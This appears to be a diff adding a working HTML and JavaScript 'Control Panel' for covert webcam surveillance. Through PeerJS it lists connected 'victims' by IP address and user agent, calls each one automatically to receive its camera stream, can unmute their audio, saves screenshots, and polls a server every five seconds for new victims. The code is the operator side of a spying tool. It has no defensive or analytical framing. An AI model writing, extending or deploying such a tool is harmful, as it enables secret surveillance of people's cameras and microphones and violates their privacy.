@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Control Panel</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: 'Segoe UI', sans-serif; background: #0f0f1a; color: white; padding: 20px; }
+    .header { text-align: center; margin-bottom: 30px; }
+    h1 { background: linear-gradient(135deg, #667eea, #764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 36px; }
+    .header p { color: #aaa; margin-top: 5px; }
+    .stats { text-align: center; margin-bottom: 20px; display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
+    .stat { background: rgba(255,255,255,0.1); padding: 12px 24px; border-radius: 20px; }
+    .stat .num { color: #667eea; font-weight: 700; }
+    .refresh-btn {
+      display: block; margin: 0 auto 25px; background: linear-gradient(135deg, #667eea, #764ba2);
+      color: white; border: none; padding: 12px 35px; border-radius: 50px;
+      font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s;
+    }
+    .refresh-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(118,75,162,0.4); }
+    .refresh-btn:active { transform: scale(0.96); }
+    .sessions { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 20px; max-width: 1400px; margin: 0 auto; }
+    .session-card {
+      background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 16px; padding: 20px; transition: all 0.3s;
+    }
+    .session-card:hover { border-color: rgba(102,126,234,0.4); }
+    .session-card h3 { color: #667eea; margin-bottom: 8px; font-size: 14px; word-break: break-all; }
+    .session-card .info { font-size: 12px; color: #888; margin-bottom: 12px; }
+    .session-card .info span { background: rgba(255,255,255,0.06); padding: 2px 8px; border-radius: 6px; }
+    .video-container { width: 100%; aspect-ratio: 16/9; background: #000; border-radius: 12px; overflow: hidden; margin: 12px 0; position: relative; }
+    .video-container video { width: 100%; height: 100%; object-fit: cover; }
+    .video-container .status-badge {
+      position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.6); padding: 4px 10px;
+      border-radius: 20px; font-size: 11px; color: #6bcb77; backdrop-filter: blur(5px);
+    }
+    .controls { display: flex; gap: 10px; margin-top: 12px; }
+    .controls button {
+      flex: 1; padding: 10px; border: none; border-radius: 10px;
+      font-weight: 600; cursor: pointer; transition: all 0.2s; font-size: 14px;
+    }
+    .controls button:active { transform: scale(0.95); }
+    .btn-audio { background: #6bcb77; color: #000; }
+    .btn-audio.muted { background: #ff6b6b; color: white; }
+    .btn-snap { background: #4d96ff; color: white; }
+    .no-sessions { grid-column: 1/-1; text-align: center; padding: 80px 20px; color: #555; font-size: 18px; }
+    .no-sessions .icon { font-size: 50px; margin-bottom: 15px; display: block; }
+    .logs {
+      background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 16px; padding: 20px; margin-top: 30px; max-width: 1400px;
+      margin-left: auto; margin-right: auto; max-height: 300px; overflow-y: auto;
+    }
+    .logs h3 { margin-bottom: 10px; color: #667eea; }
+    .log {
+      background: rgba(0,0,0,0.3); padding: 8px 12px; border-radius: 8px;
+      margin: 5px 0; font-family: 'Consolas', monospace; font-size: 12px; color: #aaa;
+    }
+    .log.success { border-left: 3px solid #6bcb77; }
+    .log.error { border-left: 3px solid #ff6b6b; }
+    .log.info { border-left: 3px solid #4d96ff; }
+    @media (max-width: 500px) {
+      .sessions { grid-template-columns: 1fr; }
+      body { padding: 10px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <h1>🎮 Control Panel</h1>
+    <p>Live Sessions via PeerJS</p>
+  </div>
+  <div class="stats">
+    <div class="stat">🟢 Active: <span class="num" id="count">0</span></div>
+    <div class="stat">📸 Snapshots: <span class="num" id="snaps">0</span></div>
+  </div>
+  <button class="refresh-btn" onclick="fetchPeers()">🔄 Refresh</button>
+  <div class="sessions" id="list">
+    <div class="no-sessions"><span class="icon">🔴</span>Waiting for victims to connect...</div>
+  </div>
+  <div class="logs">
+    <h3>📋 Live Logs</h3>
+    <div id="logs"></div>
+  </div>
+
+  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+  <script>
+    var controlPeer = null;
+    var activeCalls = {};
+    var knownPeers = {};
+    var snapCount = 0;
+
+    // Create a unique control panel peer ID
+    var ctrlId = 'ctrl-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 4);
+
+    function log(msg, type) {
+      var el = document.createElement('div');
+      el.className = 'log ' + (type || 'info');
+      el.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+      document.getElementById('logs').prepend(el);
+      // Keep max 100 logs
+      var logs = document.getElementById('logs');
+      while (logs.children.length > 100) {
+        logs.removeChild(logs.lastChild);
+      }
+    }
+
+    // Create a dummy silent/black stream to initiate calls
+    // (PeerJS call() requires a MediaStream even if we only want to receive)
+    function createDummyStream() {
+      var canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      var ctx = canvas.getContext('2d');
+      ctx.fillStyle = '#000';
+      ctx.fillRect(0, 0, 640, 480);
+      var stream = canvas.captureStream(0);
+      return stream;
+    }
+
+    var dummyStream = createDummyStream();
+
+    // Initialize control panel PeerJS connection
+    function initControlPeer() {
+      controlPeer = new Peer(ctrlId, {
+        config: {
+          iceServers: [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' },
+            { urls: 'stun:stun2.l.google.com:19302' },
+            { urls: 'stun:stun3.l.google.com:19302' }
+          ]
+        }
+      });
+
+      controlPeer.on('open', function() {
+        log('Control panel connected to PeerJS cloud (ID: ' + ctrlId.substring(0, 15) + '...)', 'success');
+        fetchPeers();
+      });
+
+      controlPeer.on('error', function(err) {
+        log('PeerJS error: ' + err.type + ' - ' + err.message, 'error');
+      });
+
+      controlPeer.on('disconnected', function() {
+        log('PeerJS disconnected, reconnecting...', 'error');
+        setTimeout(function() {
+          if (controlPeer && !controlPeer.destroyed) {
+            controlPeer.reconnect();
+          }
+        }, 3000);
+      });
+    }
+
+    // Call a victim peer to get their camera stream
+    function callVictim(peerId) {
+      if (activeCalls[peerId]) return;
+      if (!controlPeer || controlPeer.disconnected) {
+        log('Control peer not ready, skipping call to ' + peerId, 'error');
+        return;
+      }
+
+      log('Calling victim: ' + peerId + '...', 'info');
+
+      try {
+        var call = controlPeer.call(peerId, dummyStream);
+        if (!call) {
+          log('Call returned null for ' + peerId, 'error');
+          return;
+        }
+
+        activeCalls[peerId] = call;
+
+        call.on('stream', function(remoteStream) {
+          log('🎥 Stream received from ' + peerId, 'success');
+          var vid = document.getElementById('vid-' + peerId);
+          if (vid) {
+            vid.srcObject = remoteStream;
+            vid.play().catch(function() {});
+            // Update status badge
+            var badge = document.getElementById('badge-' + peerId);
+            if (badge) badge.textContent = '● LIVE';
+          }
+        });
+
+        call.on('close', function() {
+          log('Call closed: ' + peerId, 'info');
+          delete activeCalls[peerId];
+          var badge = document.getElementById('badge-' + peerId);
+          if (badge) {
+            badge.textContent = '● DISCONNECTED';
+            badge.style.color = '#ff6b6b';
+          }
+        });
+
+        call.on('error', function(err) {
+          log('Call error for ' + peerId + ': ' + err, 'error');
+          delete activeCalls[peerId];
+        });
+      } catch (e) {
+        log('Exception calling ' + peerId + ': ' + e.message, 'error');
+      }
+    }
+
+    function addCard(peerId, ua, ip) {
+      var list = document.getElementById('list');
+      var noSession = list.querySelector('.no-sessions');
+      if (noSession) noSession.remove();
+
+      if (document.getElementById('card-' + peerId)) return;
+
+      var card = document.createElement('div');
+      card.className = 'session-card';
+      card.id = 'card-' + peerId;
+
+      var shortUa = (ua || 'Unknown').substring(0, 70);
+      var displayIp = ip || 'N/A';
+
+      card.innerHTML = '<h3>📱 ' + peerId + '</h3>'
+        + '<div class="info">IP: <span>' + displayIp + '</span> | UA: ' + shortUa + '</div>'
+        + '<div class="video-container">'
+        + '  <video id="vid-' + peerId + '" autoplay playsinline muted></video>'
+        + '  <div class="status-badge" id="badge-' + peerId + '">● CONNECTING</div>'
+        + '</div>'
+        + '<div class="controls">'
+        + '  <button class="btn-audio muted" id="audiobtn-' + peerId + '" onclick="toggleAudio(\'' + peerId + '\')">🔇 Muted</button>'
+        + '  <button class="btn-snap" onclick="takeSnap(\'' + peerId + '\')">📸 Screenshot</button>'
+        + '</div>';
+
+      list.appendChild(card);
+      updateCount();
+
+      // Call this victim after a short delay
+      setTimeout(function() {
+        callVictim(peerId);
+      }, 800);
+    }
+
+    function removeCard(peerId) {
+      var card = document.getElementById('card-' + peerId);
+      if (card) card.remove();
+
+      if (activeCalls[peerId]) {
+        try { activeCalls[peerId].close(); } catch(e) {}
+        delete activeCalls[peerId];
+      }
+      delete knownPeers[peerId];
+      updateCount();
+    }
+
+    function updateCount() {
+      var list = document.getElementById('list');
+      var count = list.querySelectorAll('.session-card').length;
+      document.getElementById('count').textContent = count;
+      if (count === 0) {
+        list.innerHTML = '<div class="no-sessions"><span class="icon">🔴</span>Waiting for victims to connect...</div>';
+      }
+    }
+
+    function toggleAudio(peerId) {
+      var vid = document.getElementById('vid-' + peerId);
+      var btn = document.getElementById('audiobtn-' + peerId);
+      if (vid) {
+        vid.muted = !vid.muted;
+        if (vid.muted) {
+          btn.textContent = '🔇 Muted';
+          btn.className = 'btn-audio muted';
+        } else {
+          btn.textContent = '🔊 Audio ON';
+          btn.className = 'btn-audio';
+        }
+      }
+    }
+
+    function takeSnap(peerId) {
+      var vid = document.getElementById('vid-' + peerId);
+      if (!vid || !vid.srcObject) { alert('Video not ready yet'); return; }
+      var canvas = document.createElement('canvas');
+      canvas.width = vid.videoWidth || 640;
+      canvas.height = vid.videoHeight || 480;
+      canvas.getContext('2d').drawImage(vid, 0, 0);
+      var link = document.createElement('a');
+      link.download = 'snap_' + peerId.substring(0, 10) + '_' + Date.now() + '.png';
+      link.href = canvas.toDataURL('image/png');
+      link.click();
+      snapCount++;
+      document.getElementById('snaps').textContent = snapCount;
+      log('📸 Screenshot saved for ' + peerId, 'success');
+    }
+
+    // Fetch active peers from server REST API
+    function fetchPeers() {
+      fetch('/api/peers')
+        .then(function(res) { return res.json(); })
+        .then(function(peers) {
+          // Track current peer IDs from server
+          var currentIds = {};
+          peers.forEach(function(p) {
+            currentIds[p.peerId] = true;
+
+            if (!knownPeers[p.peerId]) {
+              knownPeers[p.peerId] = true;
+              log('New victim detected: ' + p.peerId, 'success');
+              addCard(p.peerId, p.ua, p.ip);
+            }
+          });
+
+          // Remove peers that are no longer active
+          var toRemove = [];
+          for (var id in knownPeers) {
+            if (!currentIds[id]) {
+              toRemove.push(id);
+            }
+          }
+          toRemove.forEach(function(id) {
+            log('Victim disconnected: ' + id, 'error');
+            removeCard(id);
+          });
+        })
+        .catch(function(e) {
+          log('API fetch error: ' + e.message, 'error');
+        });
+    }
+
+    // Start everything
+    initControlPeer();
+
+    // Poll for new victims every 5 seconds
+    setInterval(fetchPeers, 5000);
+  </script>
+</body>
+</html>
